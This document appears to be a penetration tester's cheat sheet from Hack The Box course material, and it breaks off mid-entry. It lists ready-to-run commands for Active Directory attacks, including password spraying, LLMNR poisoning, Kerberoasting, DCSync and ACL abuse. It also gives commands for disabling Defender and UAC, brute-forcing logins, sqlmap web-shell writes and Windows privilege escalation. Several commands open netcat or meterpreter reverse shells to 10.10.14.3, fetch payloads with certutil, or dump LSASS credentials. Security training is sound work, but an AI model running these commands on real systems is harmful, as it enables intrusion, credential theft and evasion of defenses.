# Runs the Kerbrute tool to discover usernames in the domain (INLANEFREIGHT.LOCAL) specified proceeding the -d option and the associated domain controller specified proceeding --dcusing a wordlist and outputs (-o) the results to a specified file. Performed from a Linux-based host.
./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results

# (Recommended) Force AD DNS to the DC if SRV lookups fail
bloodhound-python -d DOMAIN.LOCAL -u USER -p 'PASS' -dc DC01 -ns DC_IP -c All

# Basic collection
bloodhound-python -d DOMAIN.LOCAL -u USER -p 'PASS' -dc DC01 -c All

# Upload results to BloodHound CE
# - Produces .json files (zip them if needed) → import via BHCE UI

#Makes a zip automatically
python3 bloodhound.py -d fluffy.htb -u 'user' -p 'pass' -c all --zip -ns 10.10.10.1
#for tunel or proxychains or ligolo add ip to hosts
bloodhound-python -d inlanefreight.local -u hporter -p 'Gr8hambino!' -dc DC01.inlanefreight.local -ns 172.16.8.3 -c All --zip


#nxc approach
nxc ldap 172.16.8.3 -u hporter -p 'Gr8hambino!' --bloodhound --collection All
#nxc using ligolo or proxychains
nxc ldap 172.16.8.3 -u hporter -p 'Gr8hambino!' --bloodhound --collection All -d INLANEFREIGHT.LOCAL --dns-server 172.16.8.3

```
##### LLMNR Poisoning
```
#Responder linux
sudo responder -I ens224 -A

# Uses hashcat to crack NTLMv2 (-m) hashes that were captured by responder and saved in a file (frond_ntlmv2). The cracking is done based on a specified wordlist.
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt

#Inveigh Windows LLMNR and NBNS spoofing
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

#Also you can donwload it
PS C:\htb> .\Inveigh.exe
GET NTLMV2USERNAMES

ATT&CK lists this technique as [ID: T1557.001](https://attack.mitre.org/techniques/T1557/001), Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay

# using metasploit
# SMB version detection
use auxiliary/scanner/smb/smb_version

# SMB login brute force
use auxiliary/scanner/smb/smb_login

# Enumerate domain users
use auxiliary/scanner/smb/smb_enumusers

# Dump SAM hashes (requires admin)
use post/windows/gather/hashdump

# Kerberos user enumeration
use auxiliary/gather/kerberos_enumusers

```
##### Password Spraying and Password Policies
```
# Uses CME to extract  password policy
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

# Uses rpcclient to discover information about the domain through SMB NULL sessions. Performed from a Linux-based host.
rpcclient -U "" -N 172.16.5.5

# Uses rpcclient to enumerate the password policy in a target Windows domain from a Linux-based host.
rpcclient $> querydominfo

# Uses ldapsearch to enumerate the password policy in a target Windows domain from a Linux-based host.
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

#Enum4linux Password Policy
enum4linux -P 172.16.5.5 (DC)
enum4linux-ng -P 172.16.5.5 -oA ilfreight

#Enum user null session
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

#Enumerating Null Session from Windows
net use \\DC01\ipc$ "" /u:""
net use \\DC01\ipc$ "" /u:guest
net use \\DC01\ipc$ "password" /u:guest

# Used to enumerate the password policy in a Windows domain from a Windows-based host.
net accounts

# PowerView Command used to enumerate the password policy in a target Windows domain from a Windows-based host.
Get-DomainPolicy

# Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host.
rpcclient -U "" -N 172.16.5.5 rpcclient $> enumdomuser

# Uses CrackMapExec to discover users (--users) in a target Windows domain from a Linux-based host.
crackmapexec smb 172.16.5.5 --users

#If you have account and password you can pull more users
crackmapexec smb 172.16.5.5 -u user -p password --users

# Uses ldapsearch to discover users in a target Windows doman, then filters the output using grep to show only the sAMAccountName from a Linux-based host.
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "

#windsearch.py
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

# Uses kerbrute and a list of users (valid_users.txt) to perform a password spraying attack against a target Windows domain from a Linux-based host.

# Create a list of user first:
crackmapexec smb 172.16.7.50 -u ad.account -p password --users > ad_users_list.txt

# parse it:
$cat ad_users_list.txt | cut -d'\' -f2 | awk -F " " '{print $1}' | tee valid_users.txt

#Password Spray a list of users with a common password.
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1

#Use Kerburte and jsmith.txt
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt

# Uses CrackMapExec and the --local-auth flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using grep.
sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

#Enumerating & Retrieving Password Policies from Windows
import-module .\PowerView.ps1
PS C:\htb> Get-DomainPolicy

# Performs a password spraying attack and outputs (-OutFile) the results to a specified file (spray_success) from a Windows-based host.
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
##### [Enumerating and Bypassing AV](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/defense-evasion/disable-defender)
```
# Check if Defender is enabled
Get-MpComputerStatus
Get-MpComputerStatus | Select AntivirusEnabled

# Check if defensive modules are enabled
Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL

# Check if tamper protection is enabled
Get-MpComputerStatus | Select IsTamperProtected,RealTimeProtectionEnabled | FL

# Check for alternative Av products
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct

# Disabling UAC
cmd.exe /c "C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"

# Disables realtime monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Disables scanning for downloaded files or attachments
Set-MpPreference -DisableIOAVProtection $true

# Disable behaviour monitoring
Set-MPPreference -DisableBehaviourMonitoring $true

# Make exclusion for a certain folder
Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# Disables cloud detection
Set-MPPreference -DisableBlockAtFirstSeen $true

# Disables scanning of .pst and other email formats
Set-MPPreference -DisableEmailScanning $true

# Disables script scanning during malware scans
Set-MPPReference -DisableScriptScanning $true

# Exclude files by extension
Set-MpPreference -ExclusionExtension "ps1"

# Turn off everything and set exclusion to "C:\Windows\Temp"
Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true;Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# Bypassing with path exclusion
Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# PowerShell cmd-let used to view AppLocker policies from a Windows-based host.
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
##### Living Of The Land
```
# PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host
Get-Module

# Loads the Active Directory PowerShell module from a Windows-based host.
Import-Module ActiveDirectory

# PowerShell cmd-let used to gather Windows domain information from a Windows-based host.
Get-ADDomain

# PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by ServicePrincipalName. Performed from a Windows-based host.
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (-Filter *). Performed from a Windows-based host.
Get-ADTrust -Filter * | select name

# PowerShell cmd-let used to discover the members of a specific group (-Identity "Backup Operators"). Performed from a Windows-based host.
Get-ADGroupMember -Identity "Backup Operators"
```
##### Kerberoasting
```
# Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (-outputfile sqldev_tgs) linux-based host.
impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs
 
# PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host.
Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

# Cracking Kerberos ticket hash
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force

# Mimikatz command that ensures TGS tickets are extracted in base64 format from a Windows-based host.
mimikatz # base64 /out:true

# Mimikatz command used to extract the TGS tickets from a Windows-based host.
kerberos::list /export

# More on Mimikatz
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords

https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/mimikatz-cheatsheet/#summary

# Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host.
echo "<base64 blob>" | tr -d \\n

# Used to output a file (encoded_file) into a .kirbi file in base64 (base64 -d > sqldev.kirbi) format from a Linux-based host.
cat encoded_file | base64 -d > sqldev.kirbi

# Used to extract the Kerberos ticket. This also creates a file called crack_file from a Linux-based host.
python2.7 kirbi2john.py sqldev.kirbi

# Used to modify the crack_file for Hashcat from a Linux-based host.
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

# Uses PowerView tool to extract TGS Tickets . Performed from a Windows-based host.
Import-Module .\PowerView.ps1 Get-DomainUser * -spn | select samaccountname

# PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for Hashcat from a Windows-based host.
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# Used to request/download a TGS ticket for a specific user (/user:testspn) the formats the output in an easy to view & crack manner (/nowrap). Performed from a Windows-based host.
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

##### ACL Enumeration and Tactics
```
# PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host.
Find-InterestingDomainAcl

# Used to import PowerView and retrieve the SID of aspecific user account (wley) from a Windows-based host.
Import-Module .\PowerView.ps1 $sid = Convert-NameToSid wley

# Used to create a PSCredential Object from a Windows-based host.
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

# PowerView tool used to change the password of a specifc user (damundsen) on a target Windows domain from a Windows-based host.
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

# PowerView tool used to add a specifc user (damundsen) to a specific security group (Help Desk Level 1) in a target Windows domain from a Windows-based host.
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

# PowerView tool used to view the members of a specific security group (Help Desk Level 1) and output only the username of each member (Select MemberName) of the group from a Windows-based host.
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

# PowerView tool used create a fake Service Principal Name given a sepecift user (adunn) from a Windows-based host.
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

##### DCSync Attack
```
# PowerView tool used to view the group membership of a specific user (adunn) in a target Windows domain. Performed from a Windows-based host.
Get-DomainUser -Identity adunn | sel
ect samaccountname,objectsid,memberof,useraccountcontrol |fl

# Uses Mimikatz to perform a dcsync attack from a Windows-based host.
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator

# Uses the PowerShell cmd-let Enter-PSSession to establish a PowerShell session with a target over the network (-ComputerName ACADEMY-EA-DB01) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior ($cred & $password).
Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred

# Dump only KRBTGT (recommended for exam questions)
secretsdump.py -just-dc-user krbtgt DOMAIN.LOCAL/user:password@DC_IP

# Dump all domain secrets (noisy)
secretsdump.py -just-dc DOMAIN.LOCAL/user:password@DC_IP

# Notes:
# - Requires replication rights (e.g., Domain Admin, or DS-Replication-Get-Changes* rights)
# - Output format: user:RID:LM:NTLM:::
# - Submit NTLM (2nd hash), LM is often aad3b435...

```
##### Miscellanous Configurations
```
# SecurityAssessment.ps1 based tool used to enumerate a Windows target for MS-PRN Printer bug. Performed from a Windows-based host.
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

# PowerView tool used to display the description field of select objects (Select-Object) on a target Windows domain from a Windows-based host.
Get-DomainUser * | Select-Object samaccountname,description

# PowerView tool used to check for the PASSWD_NOTREQD setting of select objects (Select-Object) on a target Windows domain from a Windows-based host.
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

```
##### ASREPRoasting
```
# PowerView based tool used to search for the DONT_REQ_PREAUTH value across in user accounts in a target Windows domain. Performed from a Windows-based host.
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

# Uses Rubeus to perform an ASEP Roasting attack and formats the output for Hashcat. Performed from a Windows-based host.
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

# Uses Hashcat to attempt to crack the captured hash using a wordlist (rockyou.txt). Performed from a Linux-based host.
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt

# Enumerates users in a target Windows domain and automatically retrieves the AS for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host.
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

##### Trust Relationships Child Parent Trusts
```
# PowerShell cmd-let used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.
Get-ADTrust -Filter *

# PowerView tool used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.
Get-DomainTrust

# PowerView tool used to perform a domain trust mapping from a Windows-based host.
Get-DomainTrustMapping
```

##### Trust Relationships - Cross-Forest
```
# PowerView tool used to enumerate accounts for associated SPNs from a Windows-based host.
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

# PowerView tool used to enumerate the mssqlsvc account from a Windows-based host.
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof

# PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host.
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

# PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host.
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```

## Login Brute Forcing

##### Hydra
```
# Basic Auth Brute Force - User/Pass Wordlists
hydra -L wordlist.txt -P wordlist.txt -f SERVER_IP -s PORT http-get /

# Login Form Brute Force - Static User, Pass Wordlist
hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"

#ftp
hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100

#ssh
hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100

#http get/post
hydra -l admin -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

#smtp
hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com

#pop3
hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com

#imap
hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com
#mysql
hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100

#mssql
hydra -l sa -P /path/to/password_list.txt mssql://192.168.1.100

#vnc
hydra -P /path/to/password_list.txt vnc://192.168.1.100

#rdp
hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100

#Targeting Multiple servers
hydra -l root -p toor -M targets.txt ssh

#Nonstandard Port Use -s
hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp

#Brute-Forcing a Web Login Form, Look for a successful login indicated by the HTTP status code 302.
hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"

#Advanced RDP Brute-Forcing, generate and test passwords ranging from 6 to 8 characters, using the specified character set.
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp

#Login Forms
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

##### Medusa
```
#Medusa -M module, -m options, -p 'password' -P 'file.txt' -u 'username' -U users.txt
medusa -h 10.10.10.5 -u root -P rockyou.txt -M ssh -t 4

# ssh
medusa -h 10.10.10.5 -U users.txt -P passwords.txt -M ssh -t 6

# ftp
medusa -h 10.10.10.5 -u anonymous -P passwords.txt -M ftp

# rdp
medusa -h 10.10.10.5 -U users.txt -P passwords.txt -M rdp -t 2
```

##### CUPP
```
#start CUPP and aggregate details from OSINT
cupp -i

#Improve existing wordlist
cupp -w existing.txt
```


## SQLMap
```
# Run SQLMap without asking for user input
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch

# SQLMap with POST request specifying an unjection point with asterisk
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'

# Passing an HTTP request file to SQLMap
sqlmap -r req.txt

# Specifying a PUT request
sqlmap -u www.target.com --data='id=1' --method PUT

# Specifying a prefix or suffix
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"

# Basic DB enumeration
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba

# Table enumeration
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb

# Table row enumeration
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname

# Conditional enumeration
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"

# CSRF token bypass
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"

# List all tamper scripts
sqlmap --list-tampers

# Writing a file
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"

# Spawn a shell
sqlmap -u "http://www.example.com/?id=1" --os-shell

sqlmap -hh	View the advanced help menu
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch	Run SQLMap without asking for user input
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'	SQLMap with POST request
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'	POST request specifying an injection point with an asterisk
sqlmap -r req.txt	Passing an HTTP request file to SQLMap
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'	Specifying a cookie header
sqlmap -u www.target.com --data='id=1' --method PUT	Specifying a PUT request
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt	Store traffic to an output file
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch	Specify verbosity level
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"	Specifying a prefix or suffix
sqlmap -u www.example.com/?id=1 -v 3 --level=5	Specifying the level and risk
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba	Basic DB enumeration
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb	Table enumeration
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname	Table/row enumeration
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"	Conditional enumeration
sqlmap -u "http://www.example.com/?id=1" --schema	Database schema enumeration
sqlmap -u "http://www.example.com/?id=1" --search -T user	Searching for data
sqlmap -u "http://www.example.com/?id=1" --passwords --batch	Password enumeration and cracking
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"	Anti-CSRF token bypass
sqlmap --list-tampers	List all tamper scripts
sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba	Check for DBA privileges
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"	Reading a local file
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"	Writing a file
sqlmap -u "http://www.example.com/?id=1" --os-shell	Spawning an OS shell

```

## SeImpersonatePrivilege PtatoFamily

#[JuicyPotato](https://github.com/ohpe/juicy-potato) 
```
#JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards
#Juicy Potato
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *

```

#[PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

```
xp_cmdshell C:\Tools\PrintSpoofer.exe -c "c:\Tools\nc.exe 10.10.14.3 8443 -e cmd"

```

#[RoguePotato](https://github.com/antonioCoco/RoguePotato)

```
#RoguePotato without running RogueOxidResolver locally. You should run the RogueOxidResolver.exe on your remote machine. Use this if you have fw restrictions.
RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe"
#RoguePotato all in one with RogueOxidResolver running locally on port 9999
RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999
RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename
RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 -c "{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}" -p splintercode
        
```

# Windows Privilege Escalation Cheat Sheet

```
## Enumeration

#Get interface, IP address and DNS info
ipconfig /all

#Review ARP table
arp -a

#Review routing table
route print

#Check Windows Defender status
Get-MpComputerStatus

#List AppLocker rules
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

#Test AppLocker policy against a binary
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone

#Display all environment variables
set

#View detailed system configuration info
systeminfo

#Get patches and updates
wmic qfe

#Get installed programs
wmic product get name

#Display running processes
tasklist /svc

#Get logged-in users
query user

#Get current user
echo %USERNAME%

#View current user privileges
whoami /priv

#View current user group info
whoami /groups

#Get all system users
net user

#Get all system groups
net localgroup

#View details about a group
net localgroup administrators

#Get password policy
net accounts

#Display active network connections
netstat -ano

#List named pipes
pipelist.exe /accepteula

#List named pipes with PowerShell
gci \\.\pipe\

#Review permissions on a named pipe
accesschk.exe /accepteula \\.\Pipe\lsass -v

---

## Handy Commands

#Connect to MSSQL with mssqlclient.py
mssqlclient.py sql_dev@10.129.43.30 -windows-auth

#Enable xp_cmdshell
enable_xp_cmdshell

#Run OS commands with xp_cmdshell
xp_cmdshell whoami

#Escalate privileges with JuicyPotato
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 443 -e cmd.exe" -t *

#Escalate privileges with PrintSpoofer
c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

#Take memory dump with ProcDump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

#Extract credentials from LSASS dump with Mimikatz
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords

#Check ownership of a file
dir /q C:\backups\wwwroot\web.config

#Take ownership of a file
takeown /f C:\backups\wwwroot\web.config

#Confirm changed ownership of a file
Get-ChildItem -Path 'C:\backups\wwwroot\web.config' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}

#Modify a file ACL
icacls "C:\backups\wwwroot\web.config" /grant htb-student:F

#Extract hashes with secretsdump.py
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

#Copy files with Robocopy
robocopy /B E:\Windows\NTDS .\ntds ntds.dit

#Search security event logs
wevtutil qe Security /rd:true /f:text | Select-String "/user"

#Pass credentials to wevtutil
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"

#Search event logs with PowerShell
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}

#Generate malicious DLL
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

#Load a custom DLL with dnscmd
dnscmd.exe /config /serverlevelplugindll adduser.dll

#Find a user's SID
wmic useraccount where name="netadm" get sid

#Check permissions on DNS service
sc.exe sdshow DNS

#Stop a service
sc stop dns

#Start a service
sc start dns

#Query a registry key
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

#Delete a registry key
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll

#Check a service status
sc query dns

#Disable the global query block list
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local

#Add a WPAD DNS record
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3

#Compile with cl.exe
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp

#Add reference to a driver (1)
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

#Add reference to a driver (2)
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

#Check if driver is loaded
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom

#Load driver with EoPLoadDriver
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

#Check service permissions with PsService
c:\Tools\PsService.exe security AppReadiness

#Modify a service binary path
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

#Confirm UAC is enabled
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

#Check UAC level
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

#Check Windows version
[environment]::OSVersion.Version

#Review PATH variable
cmd /c echo %PATH%

#Download file with cURL in PowerShell
curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"

#Execute custom DLL with rundll32
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll

#Run SharpUp audit
.\SharpUp.exe audit

#Check service permissions with icacls
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

#Replace a service binary
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"

#Search for unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v "\""

#Check for weak service ACLs in the registry
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services

#Change ImagePath with PowerShell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"

#Check startup programs
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl

#Generate a malicious binary
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe

#Enumerate a process ID with PowerShell
get-process -Id 3324

#Enumerate a running service by name
get-service | ? {$_.DisplayName -like 'Druva*'}

---

## Credential Theft

#Search for files containing the word "password"
findstr /SIM /C:"password" *.txt *ini *.cfg *.config *.xml

#Search for passwords in Chrome dictionary files
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password

#Confirm PowerShell history save path
(Get-PSReadLineOption).HistorySavePath

#Read PowerShell history file
gc (Get-PSReadLineOption).HistorySavePath

#Decrypt PowerShell credentials
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'

#Search file contents for a string
cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt

#Search file contents for a string (alt)
findstr /si password *.xml *.ini *.txt *.config

#Search file contents for a string (recursive)
findstr /spin "password" *.*

#Search file contents with PowerShell
select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password

#Search for credential-related file extensions
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*

#Search for config files
where /R C:\ *.config

#Search for credential files with PowerShell
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore

#List saved credentials
cmdkey /list

#Retrieve saved Chrome credentials
.\SharpChrome.exe logins /unprotect

#View LaZagne help menu
.\lazagne.exe -h

#Run all LaZagne modules
.\lazagne.exe all

#Run SessionGopher
Invoke-SessionGopher -Target WINLPE-SRV01

#View saved wireless networks
netsh wlan show profile

#Retrieve saved wireless passwords
netsh wlan show profile ilfreight_corp key=clear

---

## Other Commands

#Transfer file with certutil
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat

#Encode file with certutil
certutil -encode file1 encodedfile

#Decode file with certutil
certutil -decode encodedfile file2

#Query AlwaysInstallElevated registry key (user)
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

#Query AlwaysInstallElevated registry key (machine)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

#Generate a malicious MSI package
